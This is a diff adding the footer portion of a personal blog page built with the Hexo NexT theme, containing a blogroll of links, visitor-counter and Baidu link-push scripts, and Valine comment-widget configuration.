+          <a href="https://blog.backcover7.cc/" title="https:&#x2F;&#x2F;blog.backcover7.cc&#x2F;" rel="noopener" target="_blank">backcover7</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://cyto.top/" title="https:&#x2F;&#x2F;cyto.top&#x2F;" rel="noopener" target="_blank">Cytosine</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.csdn.net/PeterZ1997/" title="https:&#x2F;&#x2F;blog.csdn.net&#x2F;PeterZ1997&#x2F;" rel="noopener" target="_blank">PeterZ</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://ju5tw4nty0u.top/" title="http:&#x2F;&#x2F;ju5tw4nty0u.top&#x2F;" rel="noopener" target="_blank">ju5tw4nty0u</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://blog.thecosmos.cn/" title="http:&#x2F;&#x2F;blog.thecosmos.cn&#x2F;" rel="noopener" target="_blank">Cosmos</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://nepire.github.io/" title="https:&#x2F;&#x2F;nepire.github.io&#x2F;" rel="noopener" target="_blank">Nepire</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.anonym1ty.cn/" title="http:&#x2F;&#x2F;www.anonym1ty.cn&#x2F;" rel="noopener" target="_blank">豆浆油条</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://a3ura.github.io/" title="https:&#x2F;&#x2F;a3ura.github.io&#x2F;" rel="noopener" target="_blank">A3ura</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://lihuaiqiu.github.io/" title="https:&#x2F;&#x2F;lihuaiqiu.github.io&#x2F;" rel="noopener" target="_blank">离怀秋</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.zhaoj.in/" title="https:&#x2F;&#x2F;www.zhaoj.in&#x2F;" rel="noopener" target="_blank">glzjin</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.sketchplane.top/" title="http:&#x2F;&#x2F;www.sketchplane.top&#x2F;" rel="noopener" target="_blank">sketch_pl4ne</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.yk2.work/" title="http:&#x2F;&#x2F;www.yk2.work&#x2F;" rel="noopener" target="_blank">yk2</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.star123.top/" title="http:&#x2F;&#x2F;www.star123.top&#x2F;" rel="noopener" target="_blank">star</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  <script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
+  <script src="/live2d-widget/autoload.js"></script>
+  
+  &copy; 2018 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">南溟丷</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <!--
+        <span class="post-meta-item-icon">
+          <i class="fa fa-user"></i>
+        </span>
+      -->
+      有
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <!--
+      <span class="post-meta-divider">|</span>
+    -->
+    <span class="post-meta-divider">只猫来偷了</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <!--
+        <span class="post-meta-item-icon">
+          <i class="fa fa-eye"></i>
+        </span>
+      -->
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+      条鱼
+    </span>
+</div>
+
+
+
+
+
+
+<script>
+  (function() {
+    function leancloudSelector(url) {
+      url = encodeURI(url);
+      return document.getElementById(url).querySelector('.leancloud-visitors-count');
+    }
+
+    function addCount(Counter) {
+      var visitors = document.querySelector('.leancloud_visitors');
+      var url = decodeURI(visitors.id);
+      var title = visitors.dataset.flagTitle;
+
+      Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({ url })))
+        .then(response => response.json())
+        .then(({ results }) => {
+          if (results.length > 0) {
+            var counter = results[0];
+            leancloudSelector(url).innerText = counter.time + 1;
+            Counter('put', '/classes/Counter/' + counter.objectId, { time: { '__op': 'Increment', 'amount': 1 } })
+              .catch(error => {
+                console.error('Failed to save visitor count', error);
+              });
+          } else {
+              leancloudSelector(url).innerText = 'Counter not initialized! More info at console err msg.';
+              console.error('ATTENTION! LeanCloud counter has security bug, see how to solve it here: https://github.com/theme-next/hexo-leancloud-counter-security. \n However, you can still use LeanCloud without security, by setting `security` option to `false`.');
+            
+          }
+        })
+        .catch(error => {
+          console.error('LeanCloud Counter Error', error);
+        });
+    }
+
+    function showTime(Counter) {
+      var visitors = document.querySelectorAll('.leancloud_visitors');
+      var entries = [...visitors].map(element => {
+        return decodeURI(element.id);
+      });
+
+      Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({ url: { '$in': entries } })))
+        .then(response => response.json())
+        .then(({ results }) => {
+          for (let url of entries) {
+            let target = results.find(item => item.url === url);
+            leancloudSelector(url).innerText = target ? target.time : 0;
+          }
+        })
+        .catch(error => {
+          console.error('LeanCloud Counter Error', error);
+        });
+    }
+
+    let { app_id, app_key, server_url } = {"enable":true,"app_id":"rebG01SwSXMoY7eaX8QScfRV-MdYXbMMI","app_key":"u3yrkhkuseHahqDsz60AhPYz","server_url":null,"security":true};
+    function fetchData(api_server) {
+      var Counter = (method, url, data) => {
+        return fetch(`${api_server}/1.1${url}`, {
+          method,
+          headers: {
+            'X-LC-Id'     : app_id,
+            'X-LC-Key'    : app_key,
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+      };
+      if (CONFIG.page.isPost) {
+        if (CONFIG.hostname !== location.hostname) return;
+        addCount(Counter);
+      } else if (document.querySelectorAll('.post-title-link').length >= 1) {
+        showTime(Counter);
+      }
+    }
+
+    let api_server = app_id.slice(-9) !== '-MdYXbMMI' ? server_url : `https://${app_id.slice(0, 8).toLowerCase()}.api.lncldglobal.com`;
+
+    if (api_server) {
+      fetchData(api_server);
+    } else {
+      fetch('https://app-router.leancloud.cn/2/route?appId=' + app_id)
+        .then(response => response.json())
+        .then(({ api_server }) => {
+          fetchData('https://' + api_server);
+        });
+    }
+  })();
+</script>
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.1.0/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/velocity-animate@1/velocity.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/velocity-animate@1/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+  <script>
+    (function(){
+      var canonicalURL, curProtocol;
+      //Get the <link> tag
+      var x=document.getElementsByTagName("link");
+		//Find the last canonical URL
+		if(x.length > 0){
+			for (i=0;i<x.length;i++){
+				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
+					canonicalURL=x[i].href;
+				}
+			}
+		}
+    //Get protocol
+	    if (!canonicalURL){
+	    	curProtocol = window.location.protocol.split(':')[0];
+	    }
+	    else{
+	    	curProtocol = canonicalURL.split(':')[0];
+	    }
+      //Get current URL if the canonical URL does not exist
+	    if (!canonicalURL) canonicalURL = window.location.href;
+	    //Assign script content. Replace current URL with the canonical URL
+      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
+  </script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/valine@1/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'I06GJpS9glw9Vb019QqawEVk-gzGzoHsz',
+      appKey     : 'cicAwmh5fPIP0nA0oiNQRhQk',
+      placeholder: "喵！被我抓到你偷鱼了！",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : false,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
